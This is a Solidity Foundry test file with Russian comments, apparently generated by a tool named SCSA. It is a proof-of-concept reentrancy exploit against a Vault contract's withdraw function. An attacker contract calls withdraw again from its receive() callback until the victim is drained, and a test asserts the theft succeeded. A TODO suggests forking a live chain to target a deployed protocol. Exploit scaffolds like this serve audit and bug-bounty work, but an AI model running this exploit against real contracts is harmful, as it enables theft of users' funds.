// SPDX-License-Identifier: UNLICENSED
// PoC-каркас reentrancy, сгенерирован SCSA.
// цель: Vault.withdraw (строка 6)
// TODO(hunter): проверить пути импорта, конструктор жертвы и депозит под протокол.
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

// атакующий: реентрантно вызывает уязвимую функцию из callback,
// пока у жертвы остаются средства
contract VaultAttacker {
    Vault public target;
    uint256 public constant STEP = 1 ether;

    constructor(Vault _target) {
        target = _target;
    }

    // точка входа атаки
    function attack() external payable {
        // депозит перед атакой (найден статически)
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // реентрантный callback: пока жертва платит — заходим снова
    receive() external payable {
        if (address(target).balance >= STEP) {
            target.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault victim;
    VaultAttacker attacker;

    function setUp() public {
        // TODO(hunter): для реального протокола — vm.createSelectFork(RPC, block)
        //              и адрес развёрнутой жертвы вместо new
        victim = new Vault();
        vm.deal(address(victim), 10 ether);   // наполняем жертву
        attacker = new VaultAttacker(victim);
    }

    function test_ReentrancyDrainsVictim() public {
        uint256 victimBefore   = address(victim).balance;
        uint256 attackerBefore = address(attacker).balance;

        attacker.attack{value: 1 ether}();

        // доказательство эксплойта: баланс жертвы упал, атакующего — вырос
        assertLt(address(victim).balance,   victimBefore,   "victim not drained");
        assertGt(address(attacker).balance, attackerBefore, "attacker did not profit");
    }
}
